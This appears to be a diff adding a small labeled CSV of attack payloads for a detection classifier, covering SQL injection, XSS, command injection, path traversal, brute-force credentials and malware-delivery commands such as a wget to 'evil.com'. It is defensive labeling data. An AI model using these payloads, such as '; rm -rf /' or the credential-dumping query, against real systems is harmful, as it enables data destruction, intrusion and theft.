@@ -1,0 +1,15 @@
+payload,label
+"admin' OR 1=1 --",SQL_Injection
+"' UNION SELECT username,password FROM users",SQL_Injection
+"<script>alert(1)</script>",XSS
+""><img src=x onerror=alert(1)>",XSS
+"wget http://evil.com/bot.sh",Malware_Delivery
+"curl http://malicious.site/payload",Malware_Delivery
+"; rm -rf /",Command_Injection
+"&& cat /etc/passwd",Command_Injection
+"root 123456",Brute_Force
+"admin admin123",Brute_Force
+"nmap -sV 192.168.1.1",Reconnaissance
+"../etc/passwd",Reconnaissance
+"hello world",Benign
+"test login",Benign
